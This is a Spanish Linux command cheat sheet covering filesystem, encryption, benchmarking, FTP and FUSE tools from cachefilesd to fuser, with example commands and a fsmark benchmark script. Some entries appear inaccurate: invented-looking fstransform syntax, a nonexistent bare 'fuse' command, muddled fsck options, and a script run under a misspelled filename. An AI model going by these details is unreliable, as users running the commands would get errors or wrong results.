[cachefilesd]. Administrador de almacenamiento en caché genérico en el núcleo de Linux que puede ser utilizado por sistemas de archivos de red y otros para almacenar datos en caché de forma local. Esta funcionalidad se utiliza en conjunción con sistemas de archivos específicos como AFS, NFS, y Ceph, que pueden beneficiarse del almacenamiento en caché local.
# rm -rf /var/cache/fscache/* (limpiar caché)
# systemctl status cachefilesd (verificar si está activo)


fsck
[recomendado dosfstools]. Reparar/chequear/formatear una partición no montada.
# fsck -fy /dev/hda1
# fsck.ext2 -vpf /dev/hda1 (Repara una partición ext2)
# fsck.ext3 -vpf /dev/hda1 (Repara una partición ext3)
# fsck -fpC 0 /dev/sda1
# fsck.ext4 -cDfty -C 0 /dev/sda1
# fsck.ext4 -vpf /dev/sda1 (Muestra información sobre una partición: fragmentación, inodos, bloques, archivos...)
# fsck.vfat -w -r -l -a -v -t (Reparar particion FAT32 con dirty bit activado)
Opciones:
	-A .- Permitira una navegación en toda la estructura de /etc/fstab.
	-V  .- información adicional sobre las acciones de fsck
	-t   .- Imprimir estadísticas de estado (-tt para más información)
	-a .- Repara cualquier problema que encuentra en el sistema de archivos sin preguntar (no recomendada)
	-l .- Lista todos los nombres de archivos
	-r .- Pide confirmación antes de reparar el sistema de archivos.
	-s .- Lista el superblock antes de chequear el sistema de archivos.
	sis_arch .- Especifica el sistema de archivos a verificar
	-c .- Buscar bloques dañados con badblocks (ver badblocks)
	-k .- Bloques dañados donde se almacenan con el comando anterior.
	-C 0 .- Muestra barra de progreso.
	-p .- forzar verificación y reparar automaticamente errores
	-D .- Obtimizar directorios si es posible
	-f   .- Forzar el chequeo incluso si el sistema de archivos parece correcto
	-Y   .- Asume respuesta "yes" a todas las preguntas
1.-
Autoreparación de errores al arrancar:
# nano /etc/default/rcS
Y modificar la linea:
FSCKFIX=yes


fscrypt
Es una herramienta útil para gestionar el cifrado a nivel de directorio en sistemas de archivos linux. Gestiona metadatos, generación de claves, encapsulado de claves, integración con PAM y proporciona una interfaz uniforme para crear y modificar directorios cifrados. No cifra todo el sistema de archivos, sino las carpetas que se especifiquen y sin necesidad de crear particiones cifradas separadas de los sistemas de archivos como ext4, F2FS, XFS y UBIFS.
# fscrypt setup /data (inicializar fscrypt en el sistema de archivos donde se desea trabajar y pedirá una frase de contraseña para proteger la clave maestra de fscrypt)
# fscrypt adduser usuario1 (permitir a usuario1 que pueda cifrar directorios ya que, por defecto, solo root puede cifrarlos después de la inicialización)
# fscrypt list (mostrar información sobre los directorios cifrados)
1.-
Crear un directorio cifrado:
$ cd /home/usuario1
$ mkdir secreto
# fscrypt encrypt secreto
Se te pedirá eligir un nombre para la política de cifrado, puede dejarse en blanco para un nombre predeterminado y una frase de contraseña para este directorio específico, si no se especifica, se utilizará la frase de contraseña del usuario.
# fscrypt unlock secreto (desbloquear para acceder a él y acceder al contenido como si fuera un directorio normal)
# fscrypt lock secreto (volver a proteger el contenido del directorio)
# fscrypt authorize secreto usuario2 (autorizar a usuario2 a acceder a secreto)
# fscrypt revoke secreto usuario2 (revocar el acceso de un usuario)
# fscrypt changepw secreto (cambiar la frase de contraseña de un directorio cifrado y pedirá la contraseña actual y luego la nueva)
# fscrypt unencrypt secreto (deshacer el cifrado de un directorio)
Nota.- Si la integración con PAM está configurada correctamente que a menudo se hace automáticamente durante la instalación de fscrypt, los directorios cifrados propiedad del usuario se desbloquearán automáticamente cuando el usuario inicia sesión en el sistema. Esto significa que no se tendrá que introducir la frase de contraseña de cada directorio cifrado individualmente después de iniciar sesión.


fsm-lite
Implementación ligera y eficiente de una máquina de estados finitos [Finite-State Machine - FSM] utilizada para el análisis de secuencias biológicas. Las máquinas de estados finitos son modelos computacionales que pueden estar en uno de un número finito de estados, y pueden cambiar de un estado a otro en respuesta a algunas condiciones o entradas. En bioinformática, estas máquinas se utilizan para analizar secuencias de ADN, ARN o proteínas, identificando patrones y subcadenas significativas.
$ fsm-lite -p conjunto_sano.fasta -n conjunto_enfermo.fasta -o resultados.txt (compara las secuencias en conjunto_sano.fasta y conjunto_enfermo.fasta, y guarda los motivos distintivos en resultados.txt)
$ fsm-lite -p proteinas_funcionales.fasta -n proteinas_no_funcionales.fasta -o motivos_proteinas.txt (analiza las secuencias de proteínas en proteinas_funcionales.fasta y proteinas_no_funcionales.fasta, y guarda los motivos encontrados en motivos_proteinas.txt)
$ fsm-lite -p variantes_comunes.fasta -n variantes_raras.fasta -o variantes_motivos.txt (busca motivos que diferencien las secuencias en variantes_comunes.fasta y variantes_raras.fasta, guardando los resultados en variantes_motivos.txt)


fsmark
Prueba de rendimiento para simular cargas de trabajo de escritura síncrona [write + fsync]. Puede variar el número de archivos, la profundidad del directorio, etc. Ofrece tiempos detallados de lectura, escritura, desvinculación y sincronización fsync.
$ fsmark -d /tmp/fsmark-test -n 1000 -s 4096 -S (crear 1000 archivos de 4 KB, usar fsync en cada archivo después de escribir y todo en el directorio /tmp/fsmark-test)
$ fsmark -d /tmp/fsmark-test -n 1000 -s 4096 -S -N 4 (ejecutará 4 procesos simultáneos, cada uno creando 1000 archivos de 4 KB)
$ fsmark -d /tmp/fsmark-test -n 1000 -s 4096 -S -N 4 -D 10 -m (cada proceso creará sus archivos en 10 subdirectorios y mostrar tiempo detallado por operación)
$ fsmark -d /tmp/fsmark-test -n 1000 -s 4096 -S -m (mostrará estadísticas detalladas como: tiempo promedio de escritura, tiempo en fsync, tiempo en borrado y tiempo de lectura)
$ rm -rf /tmp/fsmark-test (después de ejecutar pruebas, limpiar el directorio temporal)
1.-
script de benchmarking con fsmark, diseñado para evaluar el rendimiento de un sistema de archivos con diferentes niveles de concurrencia, tamaños de archivos y estructuras de directorios.
$ nano fsmark_benchmark.sh
       #!/bin/bash
       #
       # Ruta base para las pruebas
       TEST_DIR="/tmp/fsmark-test"
       mkdir -p "$TEST_DIR"
       #
       # Parámetros generales
       FILE_SIZE=4096       # Tamaño de archivo en bytes
       FILES_PER_THREAD=1000
       REPEAT=3             # Número de veces que repetir cada prueba
       THREADS_LIST=(1 2 4 8)  # Pruebas con diferentes niveles de concurrencia
       SUBDIRS_LIST=(1 10)     # Pruebas con diferentes números de subdirectorios
       #
       echo "=== FSMark Benchmark Script ==="
       echo "Directorio de pruebas: $TEST_DIR"
       echo "Tamaño de archivo: $FILE_SIZE bytes"
       echo "Archivos por hilo: $FILES_PER_THREAD"
       echo "Repeticiones por prueba: $REPEAT"
       echo
       #
       # Verifica que fsmark esté instalado
       if ! command -v fsmark &> /dev/null; then
           echo "❌ Error: fsmark no está instalado. Intenta con: sudo apt install fsmark"
           exit 1
       fi
       #
       # Función para ejecutar una prueba
       run_test() {
           local threads=$1
           local subdirs=$2
           echo "--- Ejecutando prueba con $threads hilo(s), $subdirs subdirectorio(s) por hilo ---"
               for ((i=1; i<=REPEAT; i++)); do
                  echo "Repetición $i de $REPEAT..."
                  fsmark -d "$TEST_DIR" -n "$FILES_PER_THREAD" -s "$FILE_SIZE" -N "$threads" -D "$subdirs" -S -m
                  echo
               done
           echo
        }
        #
        # Itera sobre combinaciones de hilos y subdirectorios
        for threads in "${THREADS_LIST[@]}"; do
            for subdirs in "${SUBDIRS_LIST[@]}"; do
                run_test "$threads" "$subdirs"
            done
        done
        #
        # Limpieza final
        echo "Limpieza del directorio de pruebas..."
        rm -rf "$TEST_DIR"
        echo " Benchmark completado."
$ chmod +x fsmark_benchmark.sh
$ ./fsmark_benchmarck.sh


fspy
Herramienta de monitorización de la actividad de un sistema de archivos.
# fspy -p 1234 (filtrar por un proceso específico usando su PID)
# fspy -T f /etc/passwd (motinorizar un archivo)
# fspy -T d /home/pep/.emacs.d/ (monitorizar un directorio)


fssync
es una herramienta de sincronización de archivos unidireccional que rastrea inodos y mantiene una base de datos local de archivos remotos, lo que le permite gestionar eficientemente una gran cantidad de directorios/archivos y detectar cambios de nombre, movimientos y enlaces físicos.
$ fssync ~/documentos /mnt/respaldo/documentos (copiará solo archivos nuevos o modificados de documentos al respaldo, detectará los movidos en origen y los reflejará en el destino y mantendrá una base de datos en DESTINO/.fssync.db)
$ fssync -n ~/documentos /mnt/respaldo/documentos (simula la sincronización sin ejecutar nada)
$ fssync -a -v ~/documentos /mnt/respaldo/documentos (incluir los archivos ocultos y atributos y en modo detallado)


fstab
(/etc/fstab). Lista todos los discos y particiones disponibles e indica cómo deben ser inicializados. Su estructura es:
* Particion punto_de_montaje sistema_de_archivos opciones respaldos orden
Y un ejemplo seria:
	/dev/sda5 /media/datos ext4 rw,users,exec,auto 0 0 (especificando el número de partición)
	UUID=0e4d9ccb-93bb-4762-8b67-c23d181fc84a / ext4 errors=remount-ro 0 1 (especificando el UUID de la partición)
Los puntos de montaje han de existir en el sistema y normalmente se colocan en /media
Algunos sitemas de archivos puede ser:
	auto (intenta descubrir automáticamente el sistema de archivos).
	ext2 (sistema de archivos común en Linux).
	ext3 (igual que ext2 pero además añade journaling).
	ext4 (introdujo significativas mejoras respecto a ext3)
	reiserfs (otro sistema muy común en Linux)
	msdos (para dispositivos que usen FAT16)
	vfat (para dispositivos que usen FAT32).
	ntfs (sistema de archivos NTFS de Windows)
	smbfs (sistema de archivos de Samba).
	nfs (sistema de archivos de red NFS)
Algunas opciones:
	auto (el dispositivo será montado automáticamente durante el inicio. auto es el valor por defecto)
	noauto (Si no se desea que el dispositivo se monte automáticamente)
	exec (permite ejecutar binarios que están en la partición)
	noexec (lo impide. ütil en particiones windows)
	ro (Montar sólo lectura)
	rw (Montar para lectura/esctritura)
	user (Permite a cualquier usuario montar el sistema de archivos)
	nouser (Solo el usuario root podrá montar el sistema de archivos)
	defaults (Utiliza las opciones por defecto: rw,exec,auto,nouser)
Respaldo. Es el comando que utiliza dump para hacer respaldos del sistema de archivos. Cero desactiva la opción.
Orden. indica el orden en que la aplicación fsck revisará la partición en busca de errores durante el inicio, si es cero el dispositivo no se revisa.


fstransform
Herramienta para cambiar un sistema de archivos de un formato a otro mientrs el sistema está funcionando, por ejemplo, de jfs/xfs/reiser a ext2/ext3/ext4, in situ y sin necesidad de copias de seguridad.
# fstransform /dev/sda1 xfs2ext4 (convertir un volumen XFS a ext4)
# fstransform /dev/sdb1 ext42x (convertirá un volumen del sistema de archivos ext4 al formato XFS)
# fstransform --status (verificar el estado del proceso de transformación)
# fstransform --cancel (cancelar una transformación en curso)


fstrcmp
Herramienta para realizar comparaciones difusas de cadenas [approximate string matching], o sea, que evalúa el grado de similitud entre dos cadenas, incluso si no son idénticas, utilizando métricas como la distancia de edición. El comando fstrcmp evalúa la similitud entre cadenas y devuelve un valor entre 0.0 [completamente diferentes] y 1.0 [idénticas].
$ fstrcmp -p cadena1 cadena2 (compara dos cadenas como arrays de bytes, por defecto)
$ fstrcmp -w cadena1 cadena2 (compara dos cadenas multibyte, útil para caracteres especiales o idiomas con codificación específica)
$ fstrcmp -a archivo1 archivo2 (compara dos archivos como arrays de bytes)
$ fstrcmp -s aguja pajar (selecciona la cadena más similar a "aguja" dentro del conjunto "pajar")


fstrm
[fstrm-bin]. Implementación en C del protocolo Frame Streams, diseñado para transportar datos binarios con una sobrecarga mínima, usando solo cuatro bytes por trama. Es un protocolo ligero y flexible que no impone un formato de codificación específico, permitiendo el uso de formatos como Protocol Buffers, JSON, XML, MessagePack, YAML, entre otros.
$ fstrm_capture -t application/dnstap -u /tmp/dnstap.sock -w output.fstrm (tipo de contenido, que los datos se leerán desde un socket Unix y se almacenarán en output.fstrm)
$ fstrm_replay -r output.fstrm -u /tmp/dnstap_replay.sock (lee el archivo Frame Streams y envía los datos a un socket Unix)
$ fstrm_capture -t application/dnstap -i 127.0.0.1:9000 -w output_tcp.fstrm (escucha en la dirección IP y puerto especificados y los datos recibidos se guardan en output_tcp.fstrm)


fsverity
Función del kernel de Linux que realiza una verificación transparente y bajo demanda de la integridad y autenticidad del contenido de archivos de solo lectura, utilizando un árbol de Merkle oculto [árbol hash] asociado al archivo.
$ fsverity enable archivo.bin (generar una firma para un archivo)
$ fsverity enable --hash-alg=sha512 archivo.bin (o con un algoritmo hash específico, sha256 es el predeterminado))
$ fsverity measure archivo.bin (comprobar si fs-verity está habilitado en un archivo)
$ fsverity digest archivo.bin > archivo.digest (generar un resumen del archivo)
$ openssl pkeyutl -sign -inkey clave-privada.pem -in archivo.digest -out archivo.sig (firmar el digest con una clave privada)
$ fsverity enable --signature=archivo.sig archivo.bin (habilitar fs-verity con verificación de firma)
$ mkfs.ext4 -O verity /dev/sdXY (crear un sistema de archivos ext4 con soporte para fs-verity)
$ mount -o verity /dev/sdXY /punto/montaje (montar con soporte para fs-verity)


fsvs
[Fast System VerSioning]. Herramienta de copia de seguridad, restauración, versionado e implementación para árboles de directorios o sistemas de archivos completos, utilizando un repositorio de Subversion [SVN] como backend. Esto permite mantener un historial de cambios, similar a como lo hace SVN para código fuente, pero aplicado a sistemas de archivos, incluyendo metadatos como permisos, propietarios y tiempos de modificación. Se necesita un repositorio SVN accesible local o remoto
$ fsvs urls file:///var/svn/repos-base file:///var/svn/repos-local /etc (superponer varios repositorios para separar contenido, un repositorio base y uno para modificaciones locales)
$ fsvs commit /etc -m "Modificaciones locales" -o url=file:///var/svn/repos-local (al hacer commit, se puede elegir a qué repositorio enviar los cambios)
$ fsvs remove /etc/old-config (marcar un archivo como eliminado en el repositorio)
$ fsvs commit /etc -m "Eliminado old-config" (con el correspondiente commit)
1.-
Ejemplos de Uso
Se supone que se tiene un repositorio SVN en file:///var/svn/repos y se quiere versionar el directorio /etc.
Para comenzar a versionar el directorio [/etc], asociandolo con un repositorio SVN y realizar un "checkout" inicial:
$ fsvs urls file:///var/svn/repos /etc
Esto crea metadatos locales en /etc/.fsvs/ para rastrear los cambios.
Una vez inicializado, realizar un commit de los archivos en /etc al repositorio:
$ fsvs commit /etc -m "Copia de seguridad inicial de /etc"
Esto guarda una instantánea de /etc, incluyendo permisos y estructura de directorios.
$ fsvs status /etc (ver qué archivos han cambiado desde el último commit. M = modificado, N = nuevo, D = eliminado)
$ fsvs update /etc (restaurar o sincronizar el directorio /etc con una versión específica del repositorio)
$ fsvs cat /etc/hosts -r4 > /etc/hosts.restored (Extrae el contenido de un archivo en una revisión especifica [-r4])
$ mv /etc/hosts.restored /etc/hosts (restaurarlo)
$ fsvs ignore /etc/*.cache /etc/tmp/ (evitar versionar ciertos archivos o directorios)
$ fsvs ignore dump (verificar los patrones ignorados)
$ fsvs commit /etc -m "Actualización tras modificar nginx.conf" (después de realizar cambios en /etc, hacer un commit incremental)
$ fsvs log /etc (inspeccionar el historial de commits)


fswatch
Herramienta multiplataforma que permite monitorear cambios en archivos y directorios, notificando cuando se modifican, crean, eliminan o mueven archivos dentro de las rutas especificadas.
$ fswatch ~/Documentos (monitoreo básico de un archivo o directorio)
$ fswatch -r ~/Documentos (monitoreo recursivo de un directorio)
$ fswatch -o ~/Documentos | xargs -n 1 bash_command (ejecutar un comando cuando se detecta un cambio)
$ fswatch --event Updated ~/Documentos (filtrará y notificará solo cuando se actualice el archivo o directorio especificado)
$ fswatch -x ~/Documentos (imprime los indicadores de eventos junto con la ruta del evento)
$ fswatch ~/Documentos ~/Videos (monitorear varios directorios)
$ fswatch -1 ~/Documentos (genera un solo registro de evento por lote cuando loes cambios no son relevantes)


fswebcam
Capturas con la webcam.
$ fswebcam --crop 200x100 --save out (Especificando medidas y archivo de salida)
$ fswebcam -r 600x500 out1.jpeg --greyscale out2.jpeg (Dos capturas, especificando resolución y la otra en escala de grises)
$ fswebcam --banner-colour "#FF0000" --save out (Con el baner de color rojo)
Algunas opciones:
	-d  (Especificar el dispositivo de video. Por defecto /dev/video0)
	--no-banner (Que la captura no muestre el baner. Por defecto sale en la parte inferior)
	--top-banner (Que el baner salga en parte superior)
	--title "linux es genial" (Mostrando un texto en el baner)
	--timestamp "%d-%m-%Y" (Mostrando en el baner la fecha en formato dia-mes-año)
	--info "Linux es un sistema genial" (Añadir un texto que se muestra debajo de la fecha con letra más pequeña)
	--invert (Haciendo un negativo de la imagen)


ftdi-eeprom
Herramienta para crear y cargar la EEPROM [Electrically Erasable Programmable Read-Only Memory] de configuración del chip FTDI [Future Technology Devices International Limited]. Esta EEPROM contiene información como el ID del proveedor y del producto, las cadenas del fabricante y del producto, la revisión, etc.
# ftdi-eeprom --device i:0x0403:0x6001 --read-eeprom (lee la EEPROM del dispositivo FTDI con ese vendor_id y product_id)
# ftdi-eeprom ftdi.cfg --flash-eeprom (carga el archivo de configuración y escribe los nuevos valores en la EEPROM)
# ftdi-eeprom ftdi.cfg --dry-run (muestra qué se cambiaría, sin escribir nada físicamente)
1.-
Ejemplo de configuración básica:
# nano ftdi.cfg
       vendor_id=0x0403
       product_id=0x6001
       manufacturer="MiEmpresa"
       product="FTDI UART"
       serial="123ABC"
Este archivo indica que se usará el ID de proveedor 0x0403 [FTDI], el ID de producto será 0x6001 [típico de FT232] y se cambia el fabricante, el producto y el número de serie.
Nota.- Hacer mal una configuración puede inutilizar temporalmente el chip.


fte
Editor. Según se lance desde las X o por consola se usará fte, xfte o sfte. F1 muestra todos los atajos y se accede a los menús de forma clásica con Alt+f...


ftff
[whichman]. Busca archivos o directorios
$ ftff -t2 logfile.txt (busca  logfile con dos errores en el nombre. permite asterisco [*])


ftp
Conexión remota por linea de comandos
# ftp -help (Para obtener ayuda)
# ftp -u usuario,clave ftp.dominio.com (Para conectarnos con un servidor)
# ftp dominio.com 20201 (Entrar especificando un puerto)
Al entrar en el directorio raiz del servidor ftp remoto con un prompt al estilo de:
ftp usuario@ftp.dominio.com:~>
Algunas opciones:
	get archivo (Recibir un fichero de la máquina remota)
	mget file file file (Recibir varios ficheros de la máquina remota.
	put archivo (Enviar un fichero desde nuestra máquina a la máquina remota)
	mput file file file (Enviar varios archivos de nuestra máquina a la máquina remota)
	quit (Para desconectarnos del servidor)
	!ls (Ejecuta una shell que permite la entrada de comandos [ls] en nuestro sistema. Con "exit" volveremos al programa de FTP)
	!xterm & (Lanzaría otra xterm)
	bell (Indica al sistema que ejecute un pitido cuando finalice la ejecución de los comandos)
	bye (Termina la ejecución de ftp)
	quit (Termina la ejecución de ftp)
	close (Termina la sesión ftp sin salir del programa)
	delete file (Borra un archivo)
	mdelete file file file (Borra varios archivos)
	reget file(Continuar bajando un fichero cortado anteriormente)
	open (conectar desde un ftp a otro)
	? (Muestra todos los comandos disponibles)
	cd, dir, ls, list, mkdir, rmdir, pwd, rename (Funionan igual que en la shell)


ftpcopy
Cliente FTP diseñado para copiar archivos o directorios de forma recursiva desde un servidor FTP y generar listados de directorios, ya sea en texto plano o HTML
$ ftpcopy -r ftp://usuario:contraseña@servidor.com/directorio_remoto /ruta/local/ (copiará todo el contenido del directorio remoto y subdirectorios a la ruta local especificada)
$ ftpcopy ftp://servidor.com/archivo1.txt ftp://servidor.com/archivo2.txt /ruta/local/ (copiarán solo los archivos especificados del servidor remoto)
$ ftpcopy -rv ftp://servidor.com/directorio_remoto /ruta/local/ --html (realiza una copia recursiva y detallada, generando además un listado HTML de los directorios)
$ ftpcopy -rv ftp://servidor.com/directorio_remoto /ruta/local/ --text (lo mismo pero el listado en texto plano)


ftpd-ssl
Servidor FTP de NetKit con autentificación y cifrado SSL. Comprueba si la otra parte también utiliza SSL; de lo contrario, recurre al protocolo FTP convencional. La principal ventaja sobre el ftpd convencional es que sus contraseñas y los datos que envíe no se envian en texto plano, por lo que nadie podrá acceder a ellos con tcpdump, Wireshark ni herramientas similares.
Archivo de configuración principal:
# nano /etc/inetd.conf
       ftp stream tcp nowait root /usr/sbin/tcpd /usr/sbin/in.ftpd -l -a
La opción -a activa el modo SSL y -l registra todas las conexiones. Si se quiere asegurar de que solo se permita el acceso cifrado, cambiar -a por -A
# openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/ssl/private/ftpd.key -out /etc/ssl/certs/ftpd.pem (generar un certificado autofirmado con OpenSSL)
# service openbsd-inetd restart (reiniciar el servicio)
$ lftp -u usuario,contraseña ftps://mi-servidor.com (conéctar desde un cliente FTP con soporte TLS/SSL, normalmente por el puerto 21)
# tcpdump -i eth0 port 21 -A (para ver que no se transmiten credenciales en texto plano. Si está cifrado, no se verá las contraseñas ni comandos legibles)


ftpgrab
Herramienta diseñada para descargar archivos desde servidores FTP, orientado a sitios web pequeños que no cuentan con los recursos para replicar árboles de versiones completos de software.
$ ftpgrab -H ftp.ejemplo.com -u usuario -p contraseña -d /ruta/local/destino (descargar todos los archivos de un servidor FTP)
$ ftpgrab -H ftp.ejemplo.com -u usuario -p contraseña -s /directorio/remoto -d /ruta/local/destino (Descarga de un directorio específico)
$ ftpgrab -H ftp.ejemplo.com -u usuario -p contraseña -d /ruta/local/destino --newer-only (Descargar solo archivos nuevos o modificados)
Ejemplo de archivo de configuración:
# nano ftpgrab.conf
       HOST="ftp.ejemplo.com"
       USER="usuario"
       PASSWORD="contraseña"
       SRCDIR="/directorio/remoto"
       DSTDIR="/ruta/local/destino"
       NEWER_ONLY=true
$ ftpgrab -f /ruta/a/ftpgrab.conf (lanzar la utilidad con el archivo especificado)
Actualizar automáticamente el sitio web cada día a las 3 AM con cron
$ crontab -e
Y añadir la linea:
0 3 * * * /usr/bin/ftpgrab -f /ruta/a/ftpgrab.conf


ftpmirror
Duplicación de la jerarquía de directorios mediante el protocolo FTP par sincronizar directorios remotos con locales y viceversa.
$ ftpmirror -v /local/directory ftp://user@server.com/path/to/destination (copiar un directorio local a un servidor FTP mostrando información durante la operación)
$ ftpmirror ftp://user@server.com/path/to/source /local/directory (copiar desde un servidor FTP a un directorio local)
$ ftpmirror -u ser -p password -r /local/directory ftp://server.com/path/to/destination (especificando usuario, contraseña y modo recursivo)


ftpsync
Herramienta específica para sistemas basados en Debian que se utiliza para sincronizar archivos entre un servidor y sus clientes. Intenta que las actualizaciones sean lo más fluidas posible, evitando que los clientes experimenten réplicas a medias. Admite réplicas parciales por arquitectura. El archivo de configuración de /etc/apt.conf.d/01ftpsync.
# ftpsync (sincronizar el sistema con los repositorios oficiales de Debian)
# ftpsync -vd --no-download (modo verbose y debug y no descargar archivos nuevos)
# ftpsync -t "package1 package2" server1.example.com (con varios servidores Debian y solo sincronizar ciertos paquetes)
# apt update (después de ejecutar ftpsync,verificar si hay actualizaciones pendientes)


ftpwatch
Herramienta que permite monitorear cambios en directorios de servidores FTP remotos y notificar al usuario cuando ocurren modificaciones, como nuevos archivos, eliminaciones o cambios. Este paquete es preferible instalarse como una tarea cron.
$ ftpwatch -u usuario -p contraseña ftp.ejemplo.com /directorio/remoto (monitorear un directorio FTP)
$ ftpwatch -u usuario -p contraseña -s ~/ftp_snapshot.db ftp.ejemplo.com /directorio (guardar la instantánea en un archivo específico especificado con -s)
$ ftpwatch -v -u usuario -p contraseña -m admin@ejemplo.com ftp.ejemplo.com /descargas (en modo verbose y notificar por correo si hay cambios con el parámetro -m)
$ ftpwatch -u usuario -p contraseña -c "/ruta/script.sh" ftp.ejemplo.com /nuevos_archivos (ejecutar un script cuando haya cambios con el prámetro -c)
Programar ftpwatch en un cron para que verifique cambios cada hora:
$ crontab -e
Y añadir la linea
0 * * * * ftpwatch -u usuario -p contraseña -m tu@email.com ftp.ejemplo.com /informes
Nota.- Las contraseñas en la línea de comandos pueden ser inseguras, mejor usar -p sin valor para que la pida interactivamente y para FTPs anónimos, usar -u anonymous y dejar la contraseña vacía.


fullquottel
Herramienta cuyo propósito es analizar correos electrónicos y respuestas en Usenet para identificar el estilo de citación utilizado: El conocido como top-posting o TOFU [Text Over, Fullquote Under], que consiste en responder completamente en la parte superior del mensaje y dejar la cita completa del mensaje original debajo y estilo jeopardy, similar al anterior, donde la respuesta precede a la pregunta. Tambien puede ayudar a identificar si el mensaje sigue otros estilos menos recomendados o si mezcla varios estilos.
$ fullquottel mensaje.txt (con un correo electrónico guardado, procesará el archivo e indicará si el mensaje utiliza top-posting, bottom-posting, interleaved o alguna otra variante)


funcoeszz
Conjunto de 65 funciones y utilidades varias. Una vez instalado:
$ funcoeszz zzzz --bashrc (Para colocar las lineas en .bashrc)
	# Instalacao das Funcoes ZZ (www.funcoeszz.net)
	source /usr/bin/funcoeszz
	export ZZPATH=/usr/bin/funcoeszz
$ source .bashrc (Releer el fichero)
$ funcoeszz zzzz (listado de los 65 funciones)
$ funcoeszz zzzz --teste (Comprobar que todos los ejecutables que necesita la aplicación estan instalados)
$ funcoeszz zzzz --atualiza (Baja las últimas versiones de las funciones)
$ funcoeszz ajuda (Ayuda muy util sobre como usar cada un de las funciones)
$ funcoeszz ascii (Lanzar una de las funciones del listado)


function
[builtin]. Create a simple command.
$ function nombre_tuncion ()
> { linux es un sistema genial
> }
$
$ nombre_funcion
Linux es un sistema genial


funnelweb
Herramienta de programación literaria iterativa. La programación literal permite escribir código y su documentación en un solo archivo, dándoles la misma importancia. Esto ayuda a producir código bien documentado. La programación literaria, consiste en escribir un programa como un texto narrativo que explique su funcionamiento, intercalando fragmentos de código con explicaciones. Esto contrasta con la práctica convencional de escribir código acompañado de comentarios.


funzip
Muestra los datos de un archivo comprimido en zip o gz.
$ funzip archivo.zip
$ funzip -contraseña archivo.gz (En caso de tener contraseña. No es muy aconsejable porque queda en el history)


fuse
[Filesystem in Userspace] Permitir montajes seguros para que los usuarios sin privilegios creen y monten sus propias implementaciones de sistemas de archivos.
$ fuse /home/USER/archivos /mnt/files (montar un sistema de archivos)
$ fusermount -u /mnt/files (desmontar)
$ df -T | grep fuse (verificar el estado del montaje)
$ fuse -o allow_other /home/USER/archivos /mnt/files (permite acceso a todos los usuarios)
Nota.- Para usar "-o" ha de descomentarse user_allow_other en /etc/fuse.conf
$ fuse -s allow_other /home/USER/archivos /mnt/files & (ejecutar en segundo plano)
1.- Para que los usuarios sin privilegios puedan acceder a todas las funciones:
# nano /etc/fuse.conf
Y descomentar:
user_allow_other


fuse-zip
Sistema de archivos FUSE para navegar, extraer, crear y modificar archivos ZIP como si fueran directorios reales.
$ fuse-zip archive.zip /mnt/zipfs (montar el archivo ZIP en /mnt/zipfs)
$ fusermount -u /mnt/zipfs (desmontar)
$ ls /mnt/zipfs (listar contenido)
$ cp /mnt/zipfs/file.txt /tmp/ (extraer un archivo y dejarlo en /tmp)
$ echo "Nuevas cosas..." >> /mnt/zipfs/nuevo_file.txt (añadir nuevo archivo al zip)
$ rm /mnt/zipfs/nuevo_file.txt (eliminar un archivo de un zip)
$ mv /mnt/zipfs/original.txt /mnt/zipfs/nuevo_nombre.txt (renombrar un archivo de un zip)


fuseext2
Se utiliza para montar sistemas de archivos ext2, ext3 y ext4 en sistemas que soportan FUSE [Filesystem in USErspace].
$ fuse-ext2 /dev/sda1 /mnt/sda1 (monta el dispositivo /dev/sda1 en el punto de montaje /mnt/sda1 con permisos de lectura y escritura)
$ fuse-ext2 ext2.img /mnt/ext2_image -o rw+ (monta la imagen ext2.img en el punto de montaje /mnt/ext2_image con permisos de lectura y escritura)
$ fuse-ext2 /dev/sda1 /mnt/sda1 -o ro,allow_other (monta el dispositivo /dev/sda1 en /mnt/sda1 en modo solo lectura y permite que otros usuarios accedan al sistema de archivos)


fusefat
Herramienta que permite montar sistemas de archivos FAT [FAT12, FAT16, FAT32, exFAT] en Linux utilizando el módulo FUSE [Filesystem in USErspace] del kernel y sin requerir permisos de root. Puede tener un rendimiento menor en comparación con los controladores nativos del kernel como vfat.
# modprobe fuse (ver si el módulo FUSE esté cargado en el kernel)
$ lsmod | grep fuse (verificar si FUSE está activo)
$ fusefat disco.img /mnt/fat -o ro (monta la imagen en modo solo lectura)
$ fusefat /dev/sdb1 ~/usb -o default_permissions,uid=$(id -u),gid=$(id -g) (permitir que el kernel maneje los permisos y que el sistema de archivos sea accesible por el usuario actual )
$ fusefat disco.img /mnt/fat -o rw+,default_permissions (la escritura en la imagen o dispositivo es experimental y puede corromper el sistema de archivos)
$ fusefat disco.img /mnt/fat -d -o ro (muestra mensajes de depuración y mantiene el proceso en primer plano)


fusefile
Utilidad que utiliza el sistema de archivos FUSE [Filesystem in USErspace] para presentar múltiples fragmentos de archivos individuales como si fueran un único archivo contiguo. En lugar de copiar físicamente el contenido de los archivos fragmentados en un nuevo archivo, fusefile crea un sistema de archivos virtual. Cuando una aplicación intenta acceder al archivo "montado" creado por fusefile, este intercepta las peticiones de lectura y las redirige a los fragmentos de archivo originales en el orden correcto. Para la aplicación, parece que está leyendo un único archivo continuo.
$ fusefile parte1.txt parte2.txt /mnt/punto_montaje/completo.txt (leer el contenido de /mnt/punto_montaje/completo.txt)
$ fusermount -u /mnt/punto_montaje/completo.txt (desmontar el sistema de archivos FUSE)
$ fusefile archivo1.txt:0-1024 archivo2.txt:512- archivo_combinado.txt (se tomarían los primeros 1024 bytes de archivo1.txt y desde el byte 512 hasta el final de archivo2.txt para presentarlos como archivo_combinado.txt)
$ fusefile -o overlay=overlay.dat parte1.txt parte2.txt /mnt/combinado_rw.txt (las escrituras realizadas en /mnt/combinado_rw.txt se almacenarían en overlay.dat)


fuseiso
Este paquete proporciona un módulo para montar imágenes ISO del sistema de archivos mediante FUSE como si fueran dispositivos físicos. También permite montar archivos .bin, .mdf, .img y .nrg de pista única.
# fuseiso imagen.iso /punto/montaje (montar la iso de forma básica)
# fuseiso http://example.com/image.iso /mnt/cdrom (montar una imagen ISO desde una URL)
# fuseiso image1.iso image2.iso /mnt/cdrom1 /mnt/cdrom2 (montar múltiples imágenes ISO)
# umount /mnt/cdrom1 (desmontar)


fuser
Cerrar particiones rebeldes, saber aplicaciones que corren en un puerto...
$ fuser -km /media/sda6     (Mata todos los procesos de la partición especificada. Luego desmontarla normal con umount)
$ fuser -n tcp 3389  (indica PID que corre en el puerto 3389)
$ fuser -k 80/tcp   (cerrar todo el tráfico tcp del puerto 80)
